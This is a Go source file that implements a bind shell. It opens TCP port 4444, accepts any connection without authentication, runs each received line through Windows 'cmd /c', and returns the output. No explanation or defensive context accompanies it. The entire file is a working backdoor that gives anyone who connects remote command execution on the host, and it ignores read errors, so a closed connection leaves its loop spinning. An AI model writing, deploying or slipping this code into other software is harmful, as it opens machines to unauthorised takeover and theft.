package main

import (
    "bufio"
    "fmt"
    "net"
    "os/exec"
)

func main() {
    listener, err := net.Listen("tcp", ":4444")
    if err != nil {
        fmt.Println("Error starting server!:", err)
        return
    }
    defer listener.Close()

    for {
        conn, err := listener.Accept()
        if err != nil {
            fmt.Println("Error accepting connection:", err)
            continue
        }
        go handleConnection(conn)
    }
}

func handleConnection(conn net.Conn) {
    defer conn.Close()
    reader := bufio.NewReader(conn)
    for {
        command, _ := reader.ReadString('\n')
        cmd := exec.Command("cmd", "/c", command)
        output, _ := cmd.CombinedOutput()
        conn.Write(output)
    }
}